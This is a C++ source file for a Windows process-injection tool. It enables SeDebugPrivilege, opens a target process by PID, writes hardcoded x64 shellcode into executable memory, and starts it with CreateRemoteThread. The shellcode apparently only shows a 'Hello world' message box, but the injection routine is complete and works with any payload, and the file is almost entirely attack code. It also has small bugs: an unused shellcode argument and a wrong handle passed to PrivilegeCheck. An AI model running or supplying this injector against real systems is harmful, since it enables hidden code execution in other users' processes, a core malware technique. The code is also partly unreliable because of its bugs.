#include <iostream>
#include <stdio.h>
#include <string>
#include <windows.h>

/*
* RESOURCES:
* https://secarma.com/process-injection-part-1-the-theory/
* https://stackoverflow.com/questions/56043589/how-to-recover-privileges-with-gettokeninformation-c
* https://learn.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
* https://stackoverflow.com/questions/17987589/adjusttokenprivileges-error-6-handle-invalid
* https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation
*/

BOOL HasPrivilege(LUID* luid, HANDLE* hToken) {
	PRIVILEGE_SET privs;
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = *luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bResult;
	PrivilegeCheck(&hToken, &privs, &bResult);
	return bResult;
}

bool SetupSeDebug() {
	printf("[*] Getting proc token...");
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		printf("\n[!] OpenProcessToken error: %lu\n", GetLastError());
		return false;
	}
	printf("success\n");

	printf("[*] Getting SeDebugPrivilege LUID...");
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid)) {
		printf("\n[!] LookupPrivilegeValue error: %lu\n", GetLastError());
		return false;
	}
	printf("success\n");

	printf("[*] Checking if we already SeDebugPrivilege...");
	if (!(HasPrivilege(&luid, &hToken))) {
		printf("false\n[*] Trying to add SeDebugPrivilege...");
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (!AdjustTokenPrivileges(hToken, FALSE, &tp,
			sizeof(TOKEN_PRIVILEGES),
			(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
			printf("[!] AdjustTokenPrivileges error: %lu\n", GetLastError());
			return false;
		}

		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
			printf("[!] The token does not have the specified privilege, does the "
				"process have permissions?\n");
			return false;
		}
		printf("success!\n");

	}
	printf("true\n");
	return true;
}

int main(int argc, char* argv[]) {
	if (argc == 1) {
		printf("[!] Usage: ProcInject.exe <PID> <SHELLCODE_IN_HEX>\n");
		return -1;
	}

	char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
	printf("[*] Shellcode size: %zu\n", sizeof(shellcode));

	if (!SetupSeDebug()) {
		return -1;
	}

	int pid = std::stoi(argv[1]);
	printf("[*] Trying to get handle for PID %d...", pid);
	HANDLE hProcess;
	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE |
		PROCESS_VM_OPERATION,
		TRUE, pid);
	if (!hProcess) {
		printf("\n[!] OpenProcess error: %lu\n", GetLastError());
		return -1;
	}
	printf("found handle: %p\n", hProcess);

	printf("[*] Allocating space...");
	LPVOID pAddress;
	pAddress = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pAddress) {
		printf("\n[!] VirtualAllocEx error: %ul", GetLastError());
		goto close_handle;
	}
	printf("success\n");

	printf("[*] Writing process memory...");
	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), &bytesWritten)) {
		printf("\n[!] WriteProcessMemory error: %ul", GetLastError());
		goto close_handle;
	}
	printf("success, wrote %lld bytes\n", bytesWritten);

	printf("[*] Creating thread...");
	HANDLE hThread;
	hThread = CreateRemoteThread(hProcess, nullptr, sizeof(shellcode), (LPTHREAD_START_ROUTINE)pAddress, nullptr, 0, NULL);
	if (!hThread) {
		printf("\n[!] CreateRemoteThread error: %ul\n", GetLastError());
		goto close_handle;
	}
	printf("success, handle = %p\n", hThread);
	CloseHandle(hThread);

close_handle:
	if (hProcess) {
		CloseHandle(hProcess);
	}

	printf("[+] Shellcode injected, have fun :)");

	return 0;
}